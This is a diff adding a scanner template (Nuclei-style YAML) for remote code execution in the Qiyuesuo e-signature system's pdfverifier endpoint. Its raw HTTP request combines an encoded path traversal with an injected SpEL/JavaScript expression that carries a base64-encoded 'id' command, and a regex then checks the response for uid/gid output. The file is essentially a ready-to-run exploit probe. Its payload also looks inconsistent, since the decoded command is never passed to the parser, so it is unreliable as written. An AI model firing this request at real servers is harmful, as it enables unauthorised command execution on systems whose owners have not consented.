@@ -1,0 +1,38 @@
+id: qiyuesuo-pdfverifier-rce
+info:
+  name: 契约锁电子签章系统pdfverifier远程代码执行
+  author: leadlife
+  severity: critical
+  description: 
+  reference: 
+    - https://vip.bdziyi.com/59059/
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: demo
+    tips:
+    repair:
+    version:
+  tags: rce,qiyuesuo
+
+http:
+  - raw:
+      - |
+        POST /pdfverifier/%2e%2e/template/html/add HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36
+        Content-Type: application/json
+
+        {"file":"1","title":"2","params":{"extensionParam":"{\"expression\":\"var a=new org.springframework.expression.spel.standard.SpelExpressionParser();var b='aWQ=';var b64=java.util.Base64.getDecoder();var deStr=new java.lang.String(b64.decode(b),'UTF-8');var c=a['parseExpression'];c.getValue();\"}","name":"test"}}
+
+    matchers-condition: and
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "((u|g)id|groups)=[0-9]{1,4}\\([a-z0-9]+\\)"
+
+      - type: status
+        status:
+          - 200
